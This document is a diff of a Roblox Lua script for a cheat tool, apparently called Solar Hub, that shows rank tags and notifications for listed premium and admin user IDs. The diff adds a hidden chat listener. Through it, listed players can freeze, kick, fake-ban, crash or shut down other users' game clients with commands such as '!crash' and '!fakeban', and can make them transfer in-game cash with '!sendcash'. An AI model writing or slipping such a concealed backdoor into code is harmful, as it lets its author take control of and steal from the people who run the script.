@@ -1,64 +1,212 @@
-getgenv().Users = {
+-- ignore the shitty code i forgot how to use the old version of textchatservice :skull:
+
+local List = {
     Premium = {
-            3989824437,
-            4006433577,
-            859041651,
-            2580980319,
-            424883150,
-            564374063,
-            1133869735,
-            2839811203,
-            267770568,
-            195532999,
-            885873293,
-            4148978554,
-            317398046,
-            3177904794,
-            1974376892,
-            3587101817,
-            1527860228,
-            263061473,
-            4163247195,
-            885873293,
+        3989824437,
+        4006433577,
+        859041651,
+        2580980319,
+        424883150,
+        564374063,
+        1133869735,
+        2839811203,
+        267770568,
+        195532999,
+        885873293,
+        4148978554,
+        317398046,
+        3177904794,
+        1974376892,
+        3587101817,
+        1527860228,
+        263061473,
+        4163247195,
+        885873293,
+        2458804512,
+        623394254,
+        3498924989,
+        4860885462,
+        4864268101,
+        2407063897,
+        1242652582,
+        4848908217,
+        4875780060,
+        4766222492,
+        4871057813,
+        4891591844,
+        1539243449,
+        2510414484,
+        4892732376,
+        4884071872,
+        4021599329,
+        4227990758,
+        4392101238,
+		4436763678,
+
     },
-    Administrator = {
-            2450635720,
-            275263932,
+    Immunity = {
+        4528438526,
+        3885813984,
+        2666019029,
+        1034562190,
+        4392101238,
+        1967441305,
+        4851214436
     },
-    Owner = {
-            759881255,
+    Booster = {
+        2624863798,
+        3304221951,
+        4883434940,
+        753511215,
+        1491473510,
+        341798640,
+        4876837381
+    },
+    Moderator = {
+        1234,
+        1234,
+        1234,
+    },
+
+    Admin = {
+        209670259,
+        2450635720,
+        759881255,
+        275263932,
+        296906595,
     },
 }
 
-getgenv().Colors = {
-    Premium = Color3.fromRGB(252, 248, 0),
-    Administrator = Color3.fromRGB(0, 252, 134),
-    Owner = Color3.fromRGB(0, 218, 252),
-}
+function IHateThisShit()
+local events = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
+local messageDoneFiltering = events:WaitForChild("OnMessageDoneFiltering")
+local players = game:GetService("Players")
 
-function tagHandler()
+messageDoneFiltering.OnClientEvent:Connect(function(message)
+  local player = players:FindFirstChild(message.FromSpeaker)
+  local message = message.Message or ""
+
+  if player then
+    if table.find(List.Premium, player.UserId) or table.find(List.Admin, player.UserId) then
+		if table.find(List.Premium, game.Players.LocalPlayer.UserId) or table.find(List.Admin, game.Players.LocalPlayer.UserId) or table.find(List.Immunity, game.Players.LocalPlayer.UserId) or table.find(List.Booster, game.Players.LocalPlayer.UserId) then else
+		if message == "!freeze" then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+		elseif message == "!unfreeze" then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+		elseif message == "!check" then
+			game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("solar winning 😁","All")
+		elseif message == "!kick" then
+				game.Players.LocalPlayer:Kick("Kicked by "..tostring(player))
+		elseif message == "!close" then
+				game:Shutdown()
+		elseif message == "!fakeban" then
+				game.Players.LocalPlayer:Kick("YOU HAVE BEEN PERMANENTLY BANNED FROM SOUTH LONDON 2 !")
+		elseif message == "!crash" then
+				while true do end
+		elseif message == "!sendcash" then
+				local args = {
+						[1] = 500,
+						[2] = player
+					}
+
+				game:GetService("ReplicatedStorage"):WaitForChild("Send"):FireServer(unpack(args))
+		end
+		end
+	end
+		end
+end)
+
+end
+-- tag handling
+
+function TagHandler()
     for i, v in pairs(game.Players:GetPlayers()) do
-        if table.find(getgenv().Users.Premium, v.UserId) then
+        if table.find(List.Premium, v.UserId) and v.Character then
             game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Visible = true
             game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Font = "Gotham"
-            game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.TextColor3 = getgenv().Colors.Premium
+            game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.TextColor3 = Color3.fromRGB(255, 230, 5)
             game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Text = "SOLAR HUB PREMIUM"
-        elseif table.find(getgenv().Users.Administrator, v.UserId) then
+        elseif table.find(List.Admin, v.UserId) and v.Character then
             game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Visible = true
             game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Font = "Gotham"
-            game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.TextColor3 = getgenv().Colors.Administrator
+            game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.TextColor3 = Color3.fromRGB(5, 105, 255)
             game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Text = "SOLAR HUB ADMIN"
-        elseif table.find(getgenv().Users.Owner, v.UserId) then
+        elseif table.find(List.Moderator, v.UserId) and v.Character then
             game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Visible = true
             game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Font = "Gotham"
-            game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.TextColor3 = getgenv().Colors.Owner
-            game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Text = "SOLAR HUB OWNER"
+            game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.TextColor3 = Color3.fromRGB(224, 0, 22)
+            game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Text = "SOLAR HUB MOD"
+        elseif table.find(List.Booster, v.UserId) and v.Character then
+           game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Visible = true
+            game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Font = "Gotham"
+            game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.TextColor3 = Color3.fromRGB(250, 0, 246)
+            game.Players[v.Name].Character.Head.Gui.MainFrame.Rank.Text = "SOLAR HUB BOOSTER"
         end
     end
 end
-while task.wait(3) do
-local succ, err = pcall(tagHandler)
-if not succ then
-    game.Players.LocalPlayer:Kick("Error occurred while loading premium.")
+
+
+-- premium command shit
+
+-- check if an admin/premium user is already in game
+
+for i, v in pairs(game.Players:GetPlayers()) do
+    if table.find(List.Premium, v.UserId) then
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Solar Hub",
+            Text = "Solar Hub Premium Member "..v.Name.." is in your game!",
+            Duration = 60
+        })
+    elseif table.find(List.Admin, v.UserId) then
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Solar Hub",
+            Text = "Solar Hub Admin "..v.Name.." is in your game!",
+            Duration = 60
+        })
+    end
 end
+
+-- check if admin/premium user has joined/left the game
+
+
+game.Players.PlayerAdded:Connect(function(v)
+    if table.find(List.Premium, v.UserId) then
+       game.StarterGui:SetCore("SendNotification", {
+            Title = "Solar Hub",
+            Text = "Solar Hub Premium Member "..v.Name.." has joined your game!",
+            Duration = 60
+        })
+    elseif table.find(List.Admin, v.UserId) then
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Solar Hub",
+            Text = "Solar Hub Admin "..v.Name.." has joined your game!",
+            Duration = 120
+        })
+    end
+end)
+
+game.Players.PlayerRemoving:Connect(function(v)
+    if table.find(List.Premium, v.UserId) then
+       game.StarterGui:SetCore("SendNotification", {
+            Title = "Solar Hub",
+            Text = "Solar Hub Premium Member "..v.Name.." has left your game!",
+            Duration = 60
+        })
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = originPos
+    elseif table.find(List.Admin, v.UserId) then
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Solar Hub",
+            Text = "Solar Hub Admin "..v.Name.." has left your game!",
+            Duration = 120
+        })
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = originPos
+    end
+end)
+
+-- loop the tag function  (incase user dies)
+pcall(IHateThisShit)
+while wait(3) do
+    pcall(TagHandler)
 end
